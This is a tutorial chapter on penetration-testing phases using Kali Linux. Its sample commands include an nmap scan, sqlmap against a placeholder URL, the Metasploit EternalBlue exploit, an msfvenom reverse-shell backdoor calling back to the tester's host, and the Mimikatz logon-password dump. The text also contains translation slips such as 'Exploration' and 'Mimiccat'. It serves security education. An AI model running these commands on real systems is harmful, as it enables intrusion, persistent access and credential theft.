    # Chapter 2: Penetration Testing Methodologies


    Penetration tests, or pen tests, are essential to modern cybersecurity. These
    tests simulate real attacks to identify and fix vulnerabilities in systems and
    networks before they are exploited by malicious hackers. To ensure effectiveness,
    penetration tests follow a structured and well-defined methodology. A deep understanding
    of this methodology is essential for conducting successful pen tests.


    The lifecycle of a penetration test involves several interconnected phases, from
    initial reconnaissance to creating detailed reports on findings and recommendations.
    Each phase plays a crucial role in the pen testing process, and using the correct
    tools at each stage is vital to success. By exploring each of these phases and
    the essential tools associated with them, you can build a solid, practical understanding
    of how to perform effective penetration testing using Kali Linux.


    ## Penetration Testing Lifecycle


    The penetration testing lifecycle is made up of a sequence of phases that guide
    the pentester from initial preparation to final documentation of results. These
    phases are designed to ensure that all aspects of system security are evaluated
    in a systematic and exhaustive manner.


    1. **Reconnaissance**: This is the initial phase, where the pentester collects
    information about the target. The objective is to obtain as much information as
    possible, using passive and active collection techniques. Reconnaissance is a
    key step in understanding the test environment and preparing for subsequent attacks.

    2. **Exploration**: With the information collected during reconnaissance, the
    pentester moves to the exploration phase, where he attempts to compromise the
    target system. This phase involves identifying vulnerabilities and using techniques
    and tools to exploit them.

    3. **Post-Exploitation**: After compromising the system, the pentester evaluates
    the impact of the attack, determining the level of control that can be maintained
    over the compromised system. At this stage, techniques are used to maintain access
    to the system and explore other areas of the network.

    4. **Reporting**: The final phase involves documenting the findings and creating
    a detailed report. The report must be clear, concise, and provide actionable recommendations
    to remediate the identified vulnerabilities. It serves as a guide for the security
    team to implement necessary fixes.


    ## Pentest Phases


    Each phase of pen testing is unique and requires a specific set of skills, techniques
    and tools. Understanding these phases in depth is essential for any security professional
    who wants to perform effective penetration testing.


    ### Reconnaissance


    The reconnaissance phase is the starting point of any penetration test. At this
    stage, the objective is to collect as much information as possible about the target,
    without the system detecting the pentester''s activity. Recognition can be divided
    into two types: passive recognition and active recognition.


    - **Passive Recognition**: It involves collecting information without directly
    interacting with the target system. Tools like `Whois` and `Shodan` are used to
    obtain public data, such as domain registrations, IP addresses and other information
    available on the internet.

    - **Active Recognition**: It involves direct interaction with the target system
    to collect information. Tools like `Nmap` are used to perform port scans, identifying
    running services and operating systems. A basic `Nmap` command to perform a port
    scan might be:


    ```bash

    nmap -sS -p- target_ip

    ```

    - This command scans all target ports using a stealth TCP SYN scan.


    During the reconnaissance phase, it is crucial to collect detailed information
    that will be used in subsequent pentest phases. The quality and accuracy of the
    information collected at this stage can determine the success of the penetration
    test as a whole.


    ### Exploration


    With the information collected during recognition, the pentester moves to the
    exploration phase. This phase is where the pentester attempts to compromise the
    target system by exploiting the identified vulnerabilities. Exploitation may involve
    a combination of manual and automated techniques, depending on the complexity
    of the target and the vulnerabilities discovered.


    - **Manual Exploration**: It involves detailed analysis of vulnerabilities and
    creation of custom exploits to compromise them. The pentester can use specific
    commands or develop custom scripts in languages such as `Python` or `Bash` to
    exploit a flaw. For example, if a SQL Injection vulnerability is identified, a
    manual command can be used to exploit the flaw and extract information from the
    database:


    ```bash

    sqlmap -u "http://target.com/vulnerable_page.php?id=1" --dbs

    ```

    - This command uses the `sqlmap` to automate the exploitation of a SQL Injection
    vulnerability by listing the target databases.

    - **Automated Exploration**: Tools like `Metasploit Framework` are often used
    to automate the exploration process. `Metasploit` offers a wide range of pre-configured
    exploits, allowing the pentester to carry out complex attacks with ease. A basic
    example of how to start an exploit with `Metasploit` could be:


    ```bash

    use exploit/windows/smb/ms17_010_eternalblue

    set RHOSTS target_ip

    run

    ```

    - This example exploits the vulnerability `EternalBlue` in Windows `SMB`, one
    of the most well-known and dangerous flaws.


    The exploration phase is critical, as it is where the pentester evaluates the
    effectiveness of the target system''s defenses. Success at this stage depends
    on a combination of technical skills and a deep understanding of the vulnerabilities
    in question.


    ### Post-Exploitation


    After compromising the system, the pentester enters the post-exploitation phase,
    where the focus is to consolidate control over the compromised system, expand
    access to other parts of the network, and assess the impact of the attack. At
    this stage, the objective is to maximize the level of control and obtain as much
    information as possible.


    - **Access Maintenance**: The pentester can install backdoors or use persistence
    techniques to maintain access to the compromised system. This may involve creating
    hidden users, modifying configuration files, or installing services that allow
    seamless remote access. An example command to create a simple backdoor using `Metasploit`
    is:


    ```bash

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port -f exe
    > backdoor.exe

    ```

    - This command generates a backdoor executable that can be used to obtain a reverse
    shell on the target system.

    - **Lateral Movement**: The pentester can exploit the compromised system to access
    other connected devices or networks. Tools like `Mimiccat` can be used to extract
    memory credentials, allowing the pentester to move laterally across the network:


    ```bash

    sekurlsa::logonpasswords

    ```

    - This command in `Mimikatz` extracts clear text passwords from logon processes
    into memory, enabling lateral movement.

    - **Data Exfiltration**: In some cases, the pentester may simulate the exfiltration
    of sensitive data to demonstrate the impact of a breach. This may involve copying
    critical files or extracting information from databases.


    Post-exploitation is a delicate phase and requires a high level of care and responsibility.
    The pentester must ensure that all actions performed are documented and that any
    access maintained is removed at the end of the test, so as not to leave the system
    vulnerable.


    ### Reporting


    The final phase of the pentest lifecycle is report creation. This document is
    a summary of all activities carried out, vulnerabilities identified, and recommendations
    for mitigation. The report must be clear, accurate, and accessible, serving as
    a guide for IT and security teams to implement necessary fixes.

